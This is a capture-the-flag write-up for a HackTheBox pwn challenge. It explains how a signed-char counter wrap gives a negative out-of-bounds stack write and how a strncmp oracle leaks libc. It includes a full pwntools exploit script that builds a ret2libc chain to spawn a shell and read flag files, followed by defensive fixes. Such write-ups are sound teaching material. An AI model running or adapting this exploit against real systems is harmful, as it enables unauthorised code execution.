---
layout: post
title: "Login Simulator"
date: 2028-01-31 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, integer-truncation, signed-char, oob-write, ret2libc, info-leak, glibc]
---

## Overview

Login Simulator is a Medium Pwn challenge — a 64-bit binary (glibc 2.31, **PIE + Partial
RELRO + stack canary + NX**) that lets you "register" and "login" a username. Full modern
mitigations, yet a single sign-confusion bug in the byte reader hands you a clean
`system("/bin/sh")`. The path: a signed-`char` loop counter that wraps negative → an
[out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) that reaches the
reader's *own* saved return address, plus a `strncmp` oracle over stale stack to leak libc.

## The technique

The program reads input one byte at a time in `getInput(buf, size)`, and it uses a
**signed `char`** as *both* the write index and the loop counter, with a **signed**
comparison for the bound:

```
movsx  rdx, BYTE PTR [rbp-0x9]   ; index = sign-extend(counter)   <-- movsx, not movzx
add    rdx, rax                  ; &buf[index]
mov    BYTE PTR [rdx], al        ; buf[index] = c
...
movsx  eax, BYTE PTR [rbp-0x9]   ; counter (signed)
cmp    DWORD PTR [rbp-0x1c], eax ; while (size > counter)
jg     ...
```

Three behaviours fall out of this — and together they are the whole exploit:

- A **space (`0x20`) increments the counter but skips the write** → you can *step over* a
  stack slot without touching it.
- A **newline (`0x0a`) breaks** the loop.
- The register path lets you choose `size` up to `0x80`. At exactly `size == 0x80` the
  counter reaches `0x80` = **−128** as a signed char, so `size(128) > −128` is always true:
  the loop never ends on the count, and the write index walks the whole window
  `buf[−128 .. +127]`. The **negative half reaches lower stack frames** — including
  `getInput`'s own saved return address, one frame *below* the destination buffer.

This is a numeric truncation error ([CWE-197](https://cwe.mitre.org/data/definitions/197.html))
feeding an out-of-bounds write. Measured layout on the login path (`buf = _login rbp-0xa0`):

| target | offset from `buf` |
|---|---|
| `getInput` saved RIP | **buf-0x18** |
| `getInput` saved RBP | buf-0x20 |
| `getInput` stack canary | buf-0x28 |
| stale `&_IO_2_1_stdout_` | **buf+0x20** |

Because the write reaches `getInput`'s saved RIP directly, and the canary at `buf-0x28` is
simply **stepped over with spaces** (preserved), the canary check passes with no leak needed.

## Solution

**Leak libc — a `strncmp` byte-oracle over stale stack.** Every login prints
`"Username: "` via `printf`, which leaves `&_IO_2_1_stdout_` on the stack at login `buf+0x20`.
Login then does `strncmp(login_buf, stored_pw, len)` and prints **"Good job! :^)"** (match) or
**"Invalid username!"** (mismatch) — a perfect oracle. Overwrite `login_buf[0..0x1f]` with
`'A'*0x20` (kills the leading NUL bytes that would stop `strncmp` early), send spaces so
`buf+0x20..` keeps its stale libc bytes, and brute each `stored_pw` byte (attacker-controlled
via register) until the oracle matches. `libc_base = leaked_stdout - 0x1ec6a0`. The key speed
trick: the whole 254-guess batch for one byte is **pipelined in a single send** — `scanf("%d")`
and `getInput` consume exact byte counts, so you never wait per guess.

**ret2libc over `getInput`'s saved RIP.** Register with `size = 0x80` so the login `getInput`
loops past the counter wrap, then stream 256 bytes (one per counter position `0..127,-128..-1`;
`0x20` = skip) placing the chain at `buf-0x18`:

```
[buf-0x18] pop rdi ; ret     (libc + 0x26b72)
[buf-0x10] &"/bin/sh"        (libc + 0x1b75aa)
[buf-0x08] ret               (libc + 0x25679)   ; 16-byte alignment for movaps in system
[buf+0x00] system            (libc + 0x55410)
```

Terminate with `\n` → `getInput` returns into the chain → `system("/bin/sh")`.

The full solver (pipelined leak + signed-wrap ret2libc). Save as `solve.py`:

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.arch = 'amd64'
HOST = sys.argv[1] if len(sys.argv) >= 3 else None
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 0
LIBC = ELF('./glibc/libc.so.6', checksec=False)

STDOUT_OFF = 0x1ec6a0          # _IO_2_1_stdout_
OFF_SYSTEM = 0x55410
OFF_BINSH  = 0x1b75aa
OFF_POPRDI = 0x26b72           # pop rdi ; ret
OFF_RET    = 0x25679           # ret

GI_RET   = -0x18               # getInput saved RIP, relative to login buffer
LEAK_OFF = 0x20                # login buf offset holding &_IO_2_1_stdout_
LEAK_N   = 6
BAD = (0x0a, 0x20)             # bytes getInput can't emit (newline breaks, space skips)


def conn():
    return remote(HOST, PORT) if HOST else process(['./loginsim'])


def reg_frame(payload):
    return b'1\n' + str(len(payload)).encode() + b'\n' + payload


def login_frame(login_input):
    return b'2\n' + login_input


def leak_byte(p, j, known):
    guesses = [g for g in range(256) if g not in BAD]
    batch = b''
    for g in guesses:
        stored = b'A' * LEAK_OFF + known + bytes([g])
        li = b'A' * LEAK_OFF + b' ' * (j + 1 - LEAK_OFF)
        batch += reg_frame(stored) + login_frame(li)
    p.send(batch)
    out = p.recvrepeat(2)
    idx, seen = 0, 0
    while True:
        gpos = out.find(b'Good job', idx)
        ipos = out.find(b'Invalid username', idx)
        if gpos == -1 and ipos == -1:
            break
        if gpos != -1 and (ipos == -1 or gpos < ipos):
            return guesses[seen]
        idx = ipos + 1
        seen += 1
    return None


def leak_libc(p):
    p.recvuntil(b'->', timeout=8)
    known = b''
    for k in range(LEAK_N):
        found = leak_byte(p, LEAK_OFF + k, known)
        if found is None:
            return None
        known += bytes([found])
    return u64(known.ljust(8, b'\x00')) - STDOUT_OFF


def exploit():
    for _ in range(30):
        p = conn()
        base = leak_libc(p)
        if base is None or (base & 0xfff):
            p.close(); continue
        chain = {GI_RET: base + OFF_POPRDI, GI_RET + 8: base + OFF_BINSH,
                 GI_RET + 16: base + OFF_RET, GI_RET + 24: base + OFF_SYSTEM}
        if any(c in BAD for c in b''.join(p64(v) for v in chain.values())):
            p.close(); continue
        want = {}
        for off, val in chain.items():
            for i, b in enumerate(p64(val)):
                want[off + i] = b
        p.send(b'1\n128\nBBBB\n')                       # register size=0x80
        order = list(range(0, 128)) + list(range(-128, 0))
        stream = bytearray(want.get(i, 0x20) for i in order)
        stream.append(0x0a)
        p.send(b'2\n' + bytes(stream))
        p.sendline(b'echo PWNED_$((6*7))')
        try:
            p.recvuntil(b'PWNED_42', timeout=5)
        except EOFError:
            p.close(); continue
        p.sendline(b'cat flag* /flag* /root/flag* 2>/dev/null')
        p.interactive()
        return


if __name__ == '__main__':
    exploit()
```

Run it against the instance:

```bash
python3 solve.py <target-ip> <target-port>
# ... leaked libc base, shell popped
# HTB{...}
```

Flag value redacted.

## Why it worked

A signed integer used as *both* an array index and a loop bound is the classic
[numeric truncation](https://cwe.mitre.org/data/definitions/197.html) foot-gun. `movsx`
sign-extends the counter, so once it passes `0x7f` the "index" becomes *negative* and the
write window grows **downward** into callee frames instead of upward — no canary between the
buffer and the target, because the target (`getInput`'s own saved RIP) sits below the buffer.
The "skip on space" quirk simultaneously bypasses the canary (preserve it) and turns an
uninitialised-stack `strncmp` into a byte-at-a-time leak oracle. Full PIE/RELRO/canary/NX did
nothing to stop it.

## Fix / defense

- Use an **unsigned** counter (`size_t`) and `movzx`, and bound-check the index against the
  *real* destination size — never let a caller pass a length that overflows the index type.
- Zero buffers before use so a compare/`strncmp` can't read library pointers left as stale
  stack, and don't build user-facing oracles out of raw comparison results.
- Compile with `_FORTIFY_SOURCE`; prefer `read`/`fgets` with an explicit unsigned length.
